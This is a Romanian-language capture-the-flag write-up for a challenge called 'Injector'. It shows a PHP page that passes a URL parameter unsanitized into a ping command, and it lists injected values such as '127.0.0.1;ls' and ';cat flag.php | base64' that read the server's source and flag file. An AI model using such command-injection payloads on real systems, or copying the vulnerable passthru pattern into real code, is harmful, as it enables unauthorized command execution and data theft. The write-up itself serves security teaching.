# 🧩 CTF Challenge Review: `Injector`

Acest challenge este un clasic de **Command Injection**.

---

## 🗃️ Structura Inițială

Am primit un serviciu web pe adresa:

http://<ip>:<port>/index.php?host=127.0.0.1


Pagina executa comanda:
```php
passthru("ping -c 2 " . $_GET['host']);
```

🔎 1. Testare inițială

Test standard:

http://<ip>:<port>/index.php?host=127.0.0.1

Răspuns: execută #ping#.

🧪 2. Exploatare Command Injection

Am testat concatenare cu ;:

http://<ip>:<port>/index.php?host=127.0.0.1;ls

Răspunsul a arătat:

flag.php
index.php

🧠 3. Enumerare cod sursă

Am folosit strings pentru a vedea codul din index.php:

http://<ip>:<port>/index.php?host=127.0.0.1;strings index.php


Output-ul a confirmat codul vulnerabil:

passthru("ping -c 2 " . $_GET['host']);

🔧 4. Accesarea flag.php

Citirea directă a flag.php cu cat nu a funcționat:

http://<ip>:<port>/index.php?host=127.0.0.1;cat flag.php


În schimb, am încercat alte metode:

```
strings flag.php
```

```
cat flag.php | base64
```

Exemplu:

http://<ip>:<port>/index.php?host=127.0.0.1;cat flag.php | base64


Am decodat apoi local:

```
echo "<output>" | base64 -d
```

🏁 5. Rezultat

Flag-ul a fost ascuns în fișierul flag.php.
După extragere și decodare, am obținut flag-ul final ✅
